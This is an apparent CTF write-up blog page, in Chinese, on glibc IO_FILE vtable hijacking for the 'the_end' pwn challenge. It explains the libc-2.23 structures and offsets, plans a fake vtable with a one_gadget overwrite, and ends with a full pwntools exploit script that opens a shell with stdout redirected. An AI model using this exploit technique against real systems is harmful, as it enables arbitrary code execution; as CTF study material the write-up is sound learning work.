@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vtable-Hijack(the_end) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        关于IO FILE 中的vtable劫持。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vtable-Hijack(the_end)">
+<meta property="og:url" content="http://example.com/2020/04/09/Vtable-Hijack(the_end)/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        关于IO FILE 中的vtable劫持。">
+<meta property="og:locale">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNFNnA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNFJ6H.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNFYXd.png">
+<meta property="article:published_time" content="2020-04-09T13:09:47.000Z">
+<meta property="article:modified_time" content="2020-07-14T02:56:12.187Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/07/14/UNFNnA.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-Vtable-Hijack(the_end)" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/09/Vtable-Hijack(the_end)/" class="article-date">
+  <time class="post-time" datetime="2020-04-09T13:09:47.000Z" itemprop="datePublished">
+    <span class="post-month">4月</span><br/>
+    <span class="post-day">09</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Vtable-Hijack(the_end)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        关于IO FILE 中的vtable劫持。<span id="more"></span>    </p>
+<p>​        因为在wctf2020碰到了一个贼简单(没做出来🙃)的io重定向题目，而且刘老板刷how2heap的时候也碰到了一些io相关的题目，所以我感觉该稍微了解了解pwn中的io。</p>
+<h2 id="0x00-IO入门-——-基本结构体"><a href="#0x00-IO入门-——-基本结构体" class="headerlink" title="0x00 . IO入门 —— 基本结构体"></a>0x00 . IO入门 —— 基本结构体</h2><p>​        _IO_FILE是最基本的io流相关结构，长这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br></pre></td></tr></table></figure>
+
+<p>​        _IO_FILE中有一个指针成员为chain，可以将进程中所有的_IO_FILE结构串起来，构成链表，链表头部存储在全局变量_IO_list_all中。再清理io流的时候会遍历此链表。</p>
+<p>​        进程一开始，本来啥io流都没有，但是没有io就不能实现交互，所以所有进程都存在三个自动打开的io流：stdin，stdout，stderr。分别控制程序的输入，输出和报错。这三个io流都是_IO_FILE结构，在符号表中是这样存储的:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>
+
+<p>​        _IO_FILE_plus在_IO_FILE的基础上，加上一个指向_IO_jump_t 结构体，叫vtable的指针，又封装成了一个结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>​        而这个vtable(虚表)指向的结构体，是一张函数表，存了许多与io操作相关的函数。io操作会通过交叉引用间接访问到函数表中的相关函数。这张函数表长这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  **JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-Vtable-劫持"><a href="#0x01-Vtable-劫持" class="headerlink" title="0x01 . Vtable 劫持"></a>0x01 . Vtable 劫持</h2><p>​        vtable，或者叫虚表。IO的相关操作中，某些函数会调用到虚表中的值。比如exit()会在一系列的交叉引用中调用到其虚表中的setbuf()，printf()会用到xput()等等。详细的调用只能查查看相关函数的源代码了。。。以后再详述。（🕊🕊🕊）</p>
+<p>​        虚表说起来跟got表plt表差不多(个人理解)，都可以通过劫持表来控制程序流程。但不同的是，got表可写，虚表不能直接改写，这也就限制了我们不能直接修改虚表使其指向目标函数。但是我们可以通过伪造虚表达到同样效果。大致思路如下：</p>
+<ol>
+<li>要找到虚表，得先找到它所在的结构体，即_IO_FILE_plus位于哪里。这里我们需要知道：如果文件流是以fopen()的方式打开的，那么文件流会存在堆上；而如果是stdin，stdout，stderr则是存在库文件中。本文章仅考虑后者的情况。</li>
+<li>首先我们要确定库文件的版本，根据不同版本确定vtable相对于_IO_FILE_plus开始地址的偏移量。在libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。</li>
+<li>根据偏移我们就能求出虚表的地址，就能伪造虚表劫持程序流程了。libc2.23版本下虚表的伪造不存在安全检测，更高的libc版本里则需要讨论保护绕过了。</li>
+<li>之后还需要找到函数调用过虚表中的哪个函数(victim_function)，通过固定偏移和程序中的其他漏洞，进行任意写，将victim_function换成one_gadget地址，就能getshell。</li>
+</ol>
+<h2 id="0x02-the-end"><a href="#0x02-the-end" class="headerlink" title="0x02 . the_end"></a>0x02 . the_end</h2><h3 id="1-Analysis"><a href="#1-Analysis" class="headerlink" title="1 . Analysis"></a>1 . Analysis</h3><p>​        例行公事如下：</p>
+<img src="https://s1.ax1x.com/2020/07/14/UNFNnA.png" alt="1" style="zoom:67%;" />
+
+<p>​        main函数如下，除此之外没有其他乱七八糟的函数了。。</p>
+<img src="https://s1.ax1x.com/2020/07/14/UNFJ6H.png" alt="2" style="zoom: 67%;" />
+
+<p>​        在for循环里面可以看到，程序允许用户进行五次输入操作的循环，每次循环中，将用户的第一次输入作为一个地址（可写入8个字节，对于64位程序来说恰好为一个地址），用户的第二次输入就将写在这个地址中（可写入1个字节）。</p>
+<p>​        也就是说，我们可以实现任意地址写，不过只能写5个字节。</p>
+<p>​        主函数中，for循环的任意写结束后就是exit函数了，而且题目“the_end”也很明显地提示了漏洞应该在结尾处，所以聪明机智的我考虑捯饬捯饬exit函数。</p>
+<h3 id="2-Attack"><a href="#2-Attack" class="headerlink" title="2 . Attack"></a>2 . Attack</h3><p>​        去了解之后知道了exit()函数作用是结束子进程，返回给父进程，那当然需要清理IO流咯。又了解到它清理IO流时，系统会遍历IO_list_all，调用IO_2_1_stdout_，再调用vtable 中 _setbuf 函数。</p>
+<p>​        用ida打开libc-2.23.so，先找出IO_2_1_stdout_符号，之后看结构可以确定，0x3C56F8处的就是虚表。</p>
+<img src="https://s1.ax1x.com/2020/07/14/UNFYXd.png" alt="3" style="zoom: 50%;" />
+
+<p>​        根据虚表在64位程序中的偏移，可以求出虚表的地址。</p>
+<p>​        查一下上面的虚函数表，可以计算出setbuf相对于vtable的偏移量为11 * 0x8 = 0x58（64位）。根据setbuf的偏移，可以求出setbuf的地址。</p>
+<p>​        所以我们要做的就是：伪造一个虚表，将fake_vtabel+0x58的地方改成one_gadget的地址，再将虚表指向伪造的虚表。然后函数调用到setbuf的时候就会定位到伪造虚表中的one_gadget地址。</p>
+<p>​        因为我们只能写入5个字节，所以fake_vtable+0x58与one_gadget，虚表和伪造虚表的偏移都不能太大。所以考虑将虚表定位在虚表的附近，用两个字节来覆写，然后再用剩下三个字节将one_gadget写入到fake_vtable+0x58。</p>
+<p>​        最后getshell时需要注意，程序中的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​        两行代码将输出流错误流关掉了，所以最后我们getshell的时候没有回显，具体对策是最后getshell后，进行io重定向，将输出流重定向到输入流，即使用如下命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-Exploit（from-CTF-Wiki😓）"><a href="#3-Exploit（from-CTF-Wiki😓）" class="headerlink" title="3.Exploit（from CTF-Wiki😓）"></a>3.Exploit（from CTF-Wiki😓）</h3><p>​        由于莫名其妙的原因，我在ubuntu中运行程序的时候，只能进行7次输入，然后就直接退出了。。。。也不知道自己写的exp对不对，还是贴一下CTF-Wiki的吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;the_end&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">rem = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> rem ==<span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;150.109.44.250&#x27;</span>,<span class="number">20002</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input your token:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep_ad = p.recvuntil(<span class="string">&#x27;, good luck&#x27;</span>,drop=<span class="literal">True</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">libc_base = long(sleep_ad,<span class="number">16</span>) - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02b0</span></span><br><span class="line">vtables =     libc_base + <span class="number">0x3C56F8</span></span><br><span class="line"></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3c5588</span></span><br><span class="line">target_addr = libc_base + <span class="number">0x3c55e0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;one_gadget:&#x27;</span>,<span class="built_in">hex</span>(one_gadget)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exit_addr:&#x27;</span>,<span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p.send(p64(vtables+i))</span><br><span class="line">    p.send(p64(fake_vtable)[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.send(p64(target_addr+i))</span><br><span class="line">    p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<p>​        </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/04/09/Vtable-Hijack(the_end)/" data-id="ckmlis0z7000bs0lj0bq74i1a" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/13/guess/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2018网鼎pwn (guess复现)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/16/Off_By_One/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Off_By_One (plaiddb)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
